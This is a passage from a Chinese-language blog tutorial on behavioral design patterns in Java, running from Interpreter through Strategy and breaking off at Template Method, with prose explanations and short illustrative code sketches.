<p>可以看到，客户只要简单地把任务交给第一个类，下面就可以自动地进行转发和处理，客户无需关心具体是哪个类来处理的，或者是消息是如何发到那个类的，因为接口都是一致的。</p>
<h2 id="2-命令（Command）"><a href="#2-命令（Command）" class="headerlink" title="2. 命令（Command）"></a>2. 命令（Command）</h2><blockquote>
<p>「暂缺，该模式用的不多」</p>
</blockquote>
<ul>
<li>设计</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>客户端</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意</p>
</blockquote>
<h2 id="3-解释器（Interpreter）"><a href="#3-解释器（Interpreter）" class="headerlink" title="3. 解释器（Interpreter）"></a>3. 解释器（Interpreter）</h2><blockquote>
<p>「给定一种语言，定义一个解释器来解释」</p>
</blockquote>
<p>可以用在以下场景：如果要设计一个编程语言的解释器，该语言（简单点）具有两种符号：终结符和非终结符，非终结符中包含有其他的符合序列。</p>
<ul>
<li>设计</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 语言的上下文</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Context</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解析接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Expression</span> &#123; <span class="keyword">void</span> <span class="title function_">interpret</span><span class="params">(Context text)</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 终结符解释方法</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TerminalExpression</span> <span class="keyword">implements</span> <span class="title class_">Expression</span>&#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">interpret</span><span class="params">(Context text)</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 非终结符解释方法</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NonterminalExpression</span> <span class="keyword">implements</span> <span class="title class_">Expression</span>&#123;</span><br><span class="line">	<span class="comment">// 非终结符里包含有其他符号</span></span><br><span class="line">	List&lt;Expression&gt; exp;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">interpret</span><span class="params">(Context text)</span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="4-迭代器（Iterator）"><a href="#4-迭代器（Iterator）" class="headerlink" title="4. 迭代器（Iterator）"></a>4. 迭代器（Iterator）</h2><p>适用于以下场景：客户需要依次遍历一个数据集合中的元素，但并不清楚这个集合里元素的排列顺序，也不想知道。如果知道了这个集合中的结构，把遍历方法写死在代码里，那么反而不好。迭代器模式给出了遍历集合元素的一个接口，同时又不暴露集合内部的实现细节。</p>
<p>再进一步，采用直接访问集合元素的方法，即使集合结构没有变化，也会导致问题，比如说利用数组实现的线性表存储元素，一开始我们通过数组下面遍历里面的元素，后来需求变了，要求倒序访问，那么遍历的代码就要修改，这违反了开闭原则。而如果使用迭代器的话，客户代码无需变化，因为客户根本就不知道这些元素是什么顺序提供的。</p>
<ul>
<li>设计</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 迭代接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Iterator</span>&#123;</span><br><span class="line">	Object <span class="title function_">next</span><span class="params">()</span>;</span><br><span class="line">	<span class="type">boolean</span> <span class="title function_">hasNext</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数据元素集合</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">DataSet</span> &#123; Iterator <span class="title function_">getIterator</span><span class="params">()</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数据元素具体的实现</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DataSetA</span> implements&#123;</span><br><span class="line">	<span class="comment">// 具体里面的数据表示省略了</span></span><br><span class="line">	<span class="comment">// 得到一个迭代器</span></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	Iterator <span class="title function_">getIterator</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">DataSetAIterator</span>(<span class="built_in">this</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 专门为DataSetA定义的迭代器</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DataSetAIterator</span> <span class="keyword">implements</span> <span class="title class_">Iterator</span>&#123;</span><br><span class="line">	DataSetA data;</span><br><span class="line">  </span><br><span class="line">	DataSetAIterator(DataSetA data)&#123;</span><br><span class="line">		<span class="built_in">this</span>.data=data;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> Object <span class="title function_">next</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="comment">// 按某种方法取得this.data中的下一个元素</span></span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">hasNext</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="comment">// 根据某种方法判断有没有下一个元素</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>客户端</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">DataSet</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataSetA</span>();</span><br><span class="line"><span class="type">Iterator</span> <span class="variable">ite</span> <span class="operator">=</span> a.getIterator();</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ite.next();</span><br></pre></td></tr></table></figure>

<p>迭代器模式的实现相对是比较复杂的，所以还是最好参考UML类图为好，不过使用起来是很简单的，java语言内置了迭代器，比如说Collection框架中的所有数据结构类，都实现了Iterator接口，都可以直接使用jdk提供的迭代器。这23中设计模式里有一些是java语言内置提供的，从这个意义上说，这些模式应该是比较重要和常用的。</p>
<h2 id="5-中介者（Mediator）"><a href="#5-中介者（Mediator）" class="headerlink" title="5. 中介者（Mediator）"></a>5. 中介者（Mediator）</h2><blockquote>
<p>「简化一系列对象间的通信交互」</p>
</blockquote>
<p>面向对象中有一个单一职责原则，按照这个原则来编程，对象负责什么一目了然，但往往会形成很多个对象，对象间的通信会变得很复杂，因为每个对象都需要知道和它通信的是哪些对象，如果采取中介者，则对象与另一个对象的交互问题，可以交给这个中介者，对象之间可以不必知道对方是谁，在哪里。</p>
<ul>
<li>设计</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 中介者接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Mediator</span>&#123;</span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">sendTo</span><span class="params">(String message, String name)</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 联合国是一个中介者</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MediatorUN</span> <span class="keyword">implements</span> <span class="title class_">Mediator</span>&#123;</span><br><span class="line">	<span class="comment">//联合国需要知道每一个国家</span></span><br><span class="line">	List&lt;Country&gt; country;</span><br><span class="line">  	<span class="keyword">public</span> <span class="title function_">MediatorUn</span><span class="params">(List&lt;Country&gt; country)</span>&#123;</span><br><span class="line">      	<span class="built_in">this</span>.country = country;</span><br><span class="line">	&#125;	</span><br><span class="line">  </span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">sendTo</span><span class="params">(String message, String name)</span>&#123;</span><br><span class="line">		<span class="comment">//根据name选择一个Country，然后发送消息</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 国家抽象类</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Country</span>&#123;</span><br><span class="line">	Mediator med;</span><br><span class="line">  </span><br><span class="line">	<span class="comment">// 把消息message发送给名字叫name的国家</span></span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">send</span><span class="params">(String message, String name)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 中国</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">China</span> <span class="keyword">extends</span> <span class="title class_">Country</span>&#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">send</span><span class="params">(String message, String name)</span>&#123;</span><br><span class="line">		<span class="comment">// 把消息和转发对象发给中介者，自己并不需要知道另一</span></span><br><span class="line">		<span class="comment">// 国家的具体情况</span></span><br><span class="line">		<span class="built_in">this</span>.med.sentTo(message, name);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 美国</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">USA</span> <span class="keyword">extends</span> <span class="title class_">Country</span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">send</span><span class="params">(String message, String name)</span>&#123;</span><br><span class="line">		<span class="built_in">this</span>.med.sentTo(message, name);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>有了中介者模式，对象间的交互就变得非常简单，简单地把消息交给中介者就行了。</p>
<h2 id="6-备忘录（Memento）"><a href="#6-备忘录（Memento）" class="headerlink" title="6. 备忘录（Memento）"></a>6. 备忘录（Memento）</h2><blockquote>
<p>游戏都能存档读档，但你想过这个是如何实现的吗？备忘录模式就是来做这个的</p>
</blockquote>
<ul>
<li>设计</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 备忘录，或者是存档</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Memento</span> &#123;</span><br><span class="line">	<span class="comment">// 对象的状态，简单的用String表示</span></span><br><span class="line">	String state;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">setState</span><span class="params">(String state)</span>&#123;</span><br><span class="line">		<span class="built_in">this</span>.state=state;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	String <span class="title function_">getState</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">this</span>.state;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 存档管理者</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MemManage</span>&#123;</span><br><span class="line">	<span class="comment">// 创建一个存档对象</span></span><br><span class="line">	Memento <span class="title function_">createMemento</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Memento</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 保存</span></span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">saveMem</span><span class="params">(Memento mem)</span>&#123;&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 获取某一个存档</span></span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">getMem</span><span class="params">(<span class="comment">/*参数省略了，取决于实现方法*/</span>)</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">	</span><br><span class="line"><span class="comment">// 游戏程序，可以存档</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Game</span>&#123;</span><br><span class="line">	String state;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 存档</span></span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">save</span><span class="params">(Memento mem, String state)</span>&#123;</span><br><span class="line">		mem.setState(state);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 读档</span></span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">load</span><span class="params">(Memento mem)</span>&#123;</span><br><span class="line">		<span class="built_in">this</span>.state=men.getState();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>客户端</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Game game=<span class="keyword">new</span> <span class="title class_">Game</span>();</span><br><span class="line">MemManager manager=<span class="keyword">new</span> <span class="title class_">MemManager</span>();</span><br><span class="line"><span class="comment">//存档</span></span><br><span class="line">Memento m=manager.createMemento();</span><br><span class="line">game.save(m, “存档<span class="number">1</span>”);</span><br><span class="line">manager.savaMen(m);</span><br><span class="line"><span class="comment">// 读档同上</span></span><br></pre></td></tr></table></figure>

<h2 id="7-观察者（Observer）"><a href="#7-观察者（Observer）" class="headerlink" title="7. 观察者（Observer）"></a>7. 观察者（Observer）</h2><blockquote>
<p>监听</p>
</blockquote>
<p>这个模式比较好理解，Swing里面的控件监听机制就是采用这个实现的。一个对象A需要监听另一个对象B的状态，而对象C也在监听B的状态，怎么采取一种好的方法，来实现B的状态变化之后，会通知到A和C，让它们做相应的动作，这便是观察者模式。A和C是观察者，B是被观察者。</p>
<ul>
<li>设计</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 观察接口，所以观察者都要实现该接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Observer</span> &#123; <span class="keyword">void</span> <span class="title function_">operation</span><span class="params">()</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//观察者A</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ObserverA</span> <span class="keyword">implements</span> <span class="title class_">Observer</span>&#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">operation</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="comment">// 收到通知后做相应的事</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//观察者B</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ObserverB</span> <span class="keyword">implements</span> <span class="title class_">Observer</span>&#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">operation</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="comment">// 收到通知后做相应的事</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 被观察者接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Subject</span> &#123;</span><br><span class="line">	<span class="comment">// 加入一个观察者</span></span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">add</span><span class="params">(Observer o)</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 删除一个观察者</span></span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">del</span><span class="params">(Observer o)</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 通知观察者</span></span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">notify</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 被观察对象C</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SubjectC</span> <span class="keyword">implements</span> <span class="title class_">Subject</span>&#123;</span><br><span class="line">	<span class="comment">// 比如用一个线性表存储观察者们</span></span><br><span class="line">	List&lt;Observer&gt; obs;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(Observer o)</span>&#123;</span><br><span class="line">		obs.add(o);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">del</span><span class="params">(Observer o)</span>&#123;</span><br><span class="line">		obs.remove(o);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">notify</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="type">int</span> len=<span class="built_in">this</span>.obs.length;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line">			Observer tmp=<span class="built_in">this</span>.obs.get(i);</span><br><span class="line">			tmp.operation();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>客户端</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 建立被观察对象</span></span><br><span class="line">Suject sub=<span class="keyword">new</span> <span class="title class_">SubjectC</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 建立两个观察者</span></span><br><span class="line">Observer a=<span class="keyword">new</span> <span class="title class_">ObserverA</span>();</span><br><span class="line">Observer b=<span class="keyword">new</span> <span class="title class_">ObserverB</span>();</span><br><span class="line"><span class="comment">// 向被观察对象注册</span></span><br><span class="line">sub.add(a);</span><br><span class="line">sub.add(b);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 发生了一些事件，被观察者通知各观察者进行各自相应的动作</span></span><br><span class="line">sub.notify();</span><br></pre></td></tr></table></figure>

<p>观察者模式是一个重要的接口，java swing里面的事件监听机制就是使用这个模式的典型代表，swing里面把“观察”叫做“监听”，比如说一个按钮按下之后，一个Label需要显示一些文本，另一个Label需要显示图像，那么按钮就是一个事件源，两个Label就是监听器。可以在按钮里这么写button.addActionListener(new ActionListener()); 这里的addActionListener()方法就相当于这里例子里的add，ActionListener就是这里的Observer接口。Java里面也自带了观察者模式的接口和类，可以直接使用，但我感觉并不实用，一来这些类的接口定死了，不适用于具体情况，二来这个模式很好写，没必要用系统带的。</p>
<h2 id="8-状态（State）"><a href="#8-状态（State）" class="headerlink" title="8. 状态（State）"></a>8. 状态（State）</h2><p>考虑这样一个应用：设计一个汽车前灯的开关程序，它有三个状态变化：关-&gt;近光灯-&gt;远光灯-&gt;关，也就说每按一下，就会变成下一个状态，你会如何设计？如果不考虑面向对象的设计，一般人都会这么设计：用if语句来判断，如果当前是“关”，则按下之后，变为近光，如果是近光，按下之后变远光。。。，这种做法有两个缺点：1、会有很多if语句，2、难以适应新的变化，比如中间又加了两个新状态（朝左照射和朝右照射），那么众多if语句就要做不少修改。</p>
<p>如果又加了一个新需求，要让用户能够自定义转换的顺序，比如说从关到远光，那么原来的if语句的代码，基本就要废弃重写，而状态模式可以轻松解决上述问题。</p>
<ul>
<li>设计</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义状态接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">State</span> &#123; </span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">operation</span><span class="params">(Switch s)</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义三种状态</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Off</span> <span class="keyword">implements</span> <span class="title class_">State</span>&#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">operation</span><span class="params">(Switch s)</span>&#123;</span><br><span class="line">		<span class="comment">// 执行关灯的操作</span></span><br><span class="line">		s.doOff();</span><br><span class="line">		<span class="comment">// 改变一下状态</span></span><br><span class="line">		s.state=<span class="keyword">new</span> <span class="title class_">Near</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Near</span> <span class="keyword">implements</span> <span class="title class_">State</span>&#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">operation</span><span class="params">(Switch s)</span>&#123;</span><br><span class="line">		<span class="comment">// 执行近光灯的操作</span></span><br><span class="line">		s.doNear();</span><br><span class="line">		<span class="comment">// 改变一下状态</span></span><br><span class="line">		s.state=<span class="keyword">new</span> <span class="title class_">Far</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Far</span> <span class="keyword">implements</span> <span class="title class_">State</span>&#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">operation</span><span class="params">(Switch s)</span>&#123;</span><br><span class="line">		<span class="comment">// 执行远光灯的操作</span></span><br><span class="line">		s.doFar();</span><br><span class="line">		<span class="comment">// 改变一下状态</span></span><br><span class="line">		s.state=<span class="keyword">new</span> <span class="title class_">Off</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 开关类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Switch</span> &#123;</span><br><span class="line">	State st;</span><br><span class="line">	</span><br><span class="line">	Switch(State st)&#123;</span><br><span class="line">		<span class="built_in">this</span>.st=st;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 定义按下开关的方法</span></span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">press</span><span class="params">()</span>&#123;</span><br><span class="line">		st.operation(<span class="built_in">this</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 定义三个操作</span></span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">doOff</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">doNear</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">doFar</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>客户端</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//初始状态为关</span></span><br><span class="line">Switch swi=<span class="keyword">new</span> <span class="title class_">Switch</span>(<span class="keyword">new</span> <span class="title class_">Off</span>());</span><br><span class="line"><span class="comment">// 按下三次开关</span></span><br><span class="line">swi.press();</span><br><span class="line">swi.press();</span><br><span class="line">swi.press();</span><br></pre></td></tr></table></figure>

<p>状态模式把各个状态变成一个个局部实体，并把将来可能的变化都限制在局部范围里，把各个状态实体与客户端的代码解耦，使得状态类的修改，并不会引起客户端的变化。</p>
<blockquote>
<p>注意：下面这种设计</p>
</blockquote>
<ul>
<li>设计</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Switch</span>&#123;</span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">press</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(状态关)&#123;</span><br><span class="line">			关灯</span><br><span class="line">			改状态为近光灯</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(状态近光灯)&#123;</span><br><span class="line">			开近光灯</span><br><span class="line">			改状态为远光灯</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(状态远光灯)&#123;</span><br><span class="line">			开远光灯</span><br><span class="line">			改状态为关</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>客户端</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Switch swi=<span class="keyword">new</span> <span class="title class_">Switch</span>();</span><br><span class="line"><span class="comment">// 按下三次开关</span></span><br><span class="line">swi.press();</span><br><span class="line">swi.press();</span><br><span class="line">swi.press();</span><br></pre></td></tr></table></figure>

<p>看起来如果修改了Switch类，客户端的代码并没有动，对吗？这只是从代码书写层面看没动，但是实际上修改了Switch类，Switch类当然会被重新编译，但是客户端的代码也要因此重新链接，所以实际上客户端是被影响的，这一点注意。</p>
<p>反过来看上面的状态模式的例子，由于客户端的是针对接口编程的，因此并不需要重新链接，Switch里的press()方法中的operation()方法是“动态绑定”或者叫“延迟绑定”的（也就是多态），当运行时才会去寻找究竟是哪个对象。所以即使修改了State对象，客户端的代码并没有受影响。这才是真正的松耦合，也是为什么多态是面向对象的核心机制。</p>
<h2 id="9-策略（Strategy）"><a href="#9-策略（Strategy）" class="headerlink" title="9. 策略（Strategy）"></a>9. 策略（Strategy）</h2><blockquote>
<p>「把算法部分独立出来」</p>
</blockquote>
<p>这是个很有价值的模式，考虑这样一个软件的设计：要编写一个商场收银软件，商场的商品定价机制是很灵活的，经常会根据节假日或者什么原因临时将商品打折，打折的幅度和计算方法也会经常变，那么就给代码编写带来了难度，按照以往常规的方法，会采用很多if语句来写，这显然是一种不好的方法，一个商场有成千上万种商品，每一种商品会有很多折扣方法，难道要写成千上万个if语句吗？面向对象设计的一个原则就是：把可能变化的部分独立成接口，进行灵活的扩展，策略模式正是体现了这一点。</p>
<ul>
<li>设计</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 算法接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Strategy</span> &#123; </span><br><span class="line">	<span class="type">double</span> <span class="title function_">getPrice</span><span class="params">()</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正常收费</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Normal</span> <span class="keyword">implements</span> <span class="title class_">Strategy</span>&#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getPrice</span><span class="params">()</span>&#123; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打折价格</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Discount</span> <span class="keyword">implements</span> <span class="title class_">Strategy</span>&#123;</span><br><span class="line">	<span class="meta">@Override</span> </span><br><span class="line">	<span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getPrice</span><span class="params">()</span> &#123; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 收费程序</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Casher</span>&#123;</span><br><span class="line">	Strategy strategy;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">setStrategy</span><span class="params">(Strategy strategy)</span>&#123;</span><br><span class="line">		<span class="built_in">this</span>.strategy=strategy;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 得到商品总价</span></span><br><span class="line">	<span class="type">double</span> <span class="title function_">getMoney</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> n*<span class="built_in">this</span>.strategy.getPrice();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>客户端</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Casher cash=<span class="keyword">new</span> <span class="title class_">Casher</span>();</span><br><span class="line"><span class="comment">//正常收费</span></span><br><span class="line">cash.setStrategy(<span class="keyword">new</span> <span class="title class_">Noral</span>());</span><br><span class="line">cash.getMoney(<span class="number">2</span>);</span><br><span class="line"><span class="comment">// 换成打折收费</span></span><br><span class="line">cash.setStrategy(<span class="keyword">new</span> <span class="title class_">Discount</span>());</span><br><span class="line">cash.getMoney();</span><br></pre></td></tr></table></figure>

<p>策略模式的结构非常简单，所以往往用来作为设计模式入门的例子，当然这里的setStrategy方法还是比较原始的，如果结合工厂方法等，就更加好了。</p>
<h2 id="10-模板方法（Template-Method）"><a href="#10-模板方法（Template-Method）" class="headerlink" title="10. 模板方法（Template Method）"></a>10. 模板方法（Template Method）</h2><p>适用于这样的情况：有个复杂算法，由许多小算法组成，大致的框架已经可以确定，但是这些小算法需要到运行时才能确定调用哪个，或者说需要临时更换成另一个小算法。简而言之就是框架已经定了，细节还没定。模板方法就是用来解决这个问题，这同时也是很多类库和框架的设计思路，在传统的面向过程程序设计中，由于是上层函数调用下层函数，因此实际上，上层框架逻辑函数是依赖于底层实现的，底层函数没写好，上层就不能完成编译，底层函数修改了，上层函数也要被重新链接，这明显是不合理的。面向对象由于采取了多态机制，因此上层框架可以独立出来，不受底层的影响，要替换掉底层，也不会影响上层框架。</p>
<p>考虑一个做菜的程序，比如要做鱼汤，大致步骤是确定的：先放油，再煎鱼，再放水，再放调料，但是具体放多少油，放多少水，用什么鱼，这个具体再说，或者也可以先把鱼定下来，其他部分以后再说，这个看具体设计。</p>
<ul>
<li>设计</li>
</ul>
